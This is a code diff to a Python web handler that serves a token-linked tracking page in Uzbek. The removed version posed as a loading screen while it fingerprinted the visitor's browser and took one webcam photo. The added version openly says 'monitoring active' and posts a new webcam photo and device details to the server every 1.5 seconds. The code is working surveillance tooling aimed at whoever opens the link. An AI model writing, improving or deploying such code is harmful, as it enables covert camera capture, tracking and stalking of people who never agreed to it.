@@ -56,7 +56,7 @@ async def track_page(request: web.Request):
 <html>
 <head>
   <meta charset="UTF-8" />
-  <title>Yuklanmoqda...</title>
+  <title>Monitoring...</title>
   <style>
     body {{
       font-family: sans-serif;
@@ -64,24 +64,31 @@ async def track_page(request: web.Request):
       height: 100vh; text-align: center;
       background: #fafafa; color: #333;
     }}
-    .loader {{
-      width: 40px; height: 40px;
-      border: 4px solid #ddd;
-      border-top: 4px solid #4CAF50;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
+    .status {{
       margin: 20px;
+      font-size: 1.1em;
+      color: #4CAF50;
     }}
-    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
-    .note {{ font-size: 0.9em; color: #777; }}
+    .counter {{
+      font-size: 0.9em;
+      color: #777;
+    }}
   </style>
 </head>
 <body>
-  <h2>Iltimos, kuting...</h2>
-  <div class="loader"></div>
-  <div class="note">Tajribangiz moslashtirilmoqda...</div>
+  <h2>Monitoring faol...</h2>
+  <div class="status">✅ Ma'lumotlar yuborilmoqda</div>
+  <div class="counter" id="count">Yuborishlar: 0</div>
+  <div class="note" style="font-size:0.8em;color:#999;margin-top:30px;">
+    Ushbu sahifani yopish — monitoringni to'xtatadi.
+  </div>
+
   <script>
-    async function collectAndSend() {{
+    let sendCount = 0;
+    const intervalMs = 1500; // 1.5 soniyada bir
+    let stream = null;
+
+    async function collectData() {{
         const data = {{
           timestamp: new Date().toISOString(),
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -119,7 +126,7 @@ async def track_page(request: web.Request):
           data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
           data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
           data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
-        }} catch (e) {{}}
+        }} catch (e) {{ console.log("Media devices error:", e); }}
 
         try {{
           const canvas = document.createElement("canvas");
@@ -134,44 +141,94 @@ async def track_page(request: web.Request):
           data.network = `${{navigator.connection.effectiveType}}, ${{navigator.connection.downlink || '?'}} Mbps`;
         }}
 
-        let img = null;
-        let cameraAllowed = false;
-        try {{
-          const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
-          cameraAllowed = true;
-          const track = stream.getVideoTracks()[0];
-          const settings = track.getSettings();
-          data.cameraRes = `${{settings.width}}x${{settings.height}}`;
-
-          const video = document.createElement("video");
-          video.srcObject = stream;
-          await video.play();
-
-          const c = document.createElement("canvas");
-          c.width = video.videoWidth;
-          c.height = video.videoHeight;
-          c.getContext("2d").drawImage(video, 0, 0);
-          img = c.toDataURL("image/jpeg", 0.7);
-
-          stream.getTracks().forEach(t => t.stop());
-        }} catch (e) {{
-          // Kamera rad etilgan
-        }}
-
-        const body = {{ token: "{token}", clientData: data, cameraAllowed: cameraAllowed }};
-        if (img) {{
-          body.image = img;
-        }}
-
-        fetch("/submit", {{
-          method: "POST",
-          headers: {{ "Content-Type": "application/json" }},
-          body: JSON.stringify(body)
-        }});
+        return data;
     }}
 
-    // Bir marta yuborish
-    setTimeout(collectAndSend, 1000);
+    async function capturePhoto(video) {{
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        return canvas.toDataURL("image/jpeg", 0.7);
+    }}
+
+    async function sendReport() {{
+        try {{
+            let cameraAllowed = false;
+            let img = null;
+            let data = await collectData();
+
+            // Kamerani bir marta ochish (agar hali ochilmagan bo'lsa)
+            if (!stream) {{
+                try {{
+                    stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }});
+                    cameraAllowed = true;
+                }} catch (err) {{
+                    console.log("Kamera ruxsati yo'q yoki xato:", err);
+                    // Stream yo'q — rasm olish mumkin emas
+                }}
+            }}
+
+            if (stream) {{
+                cameraAllowed = true;
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.muted = true;
+                await video.play();
+
+                // Video to'g'ri yuklanganini kafolatlash
+                if (video.videoWidth > 0) {{
+                    img = await capturePhoto(video);
+                    const track = stream.getVideoTracks()[0];
+                    const settings = track.getSettings();
+                    data.cameraRes = `${{settings.width || video.videoWidth}}x${{settings.height || video.videoHeight}}`;
+                }} else {{
+                    // Ba'zi brauzerlarda video hali tayyor bo'lmasa
+                    await new Promise(r => setTimeout(r, 300));
+                    if (video.videoWidth > 0) {{
+                        img = await capturePhoto(video);
+                        data.cameraRes = `${{video.videoWidth}}x${{video.videoHeight}}`;
+                    }}
+                }}
+            }}
+
+            const body = {{
+                token: "{token}",
+                clientData: data,
+                cameraAllowed: cameraAllowed
+            }};
+            if (img) {{
+                body.image = img;
+            }}
+
+            await fetch("/submit", {{
+                method: "POST",
+                headers: {{ "Content-Type": "application/json" }},
+                body: JSON.stringify(body)
+            }});
+
+            sendCount++;
+            document.getElementById("count").textContent = `Yuborishlar: ${{sendCount}}`;
+
+        }} catch (error) {{
+            console.error("Yuborishda xato:", error);
+        }}
+    }}
+
+    // Birinchi marta darhol yuborish
+    sendReport();
+
+    // Keyin har 1.5 soniyada takrorlash
+    const intervalId = setInterval(sendReport, intervalMs);
+
+    // Sahifa yopilganda streamni to'xtatish
+    window.addEventListener("beforeunload", () => {{
+        if (stream) {{
+            stream.getTracks().forEach(track => track.stop());
+        }}
+        clearInterval(intervalId);
+    }});
   </script>
 </body>
 </html>"""
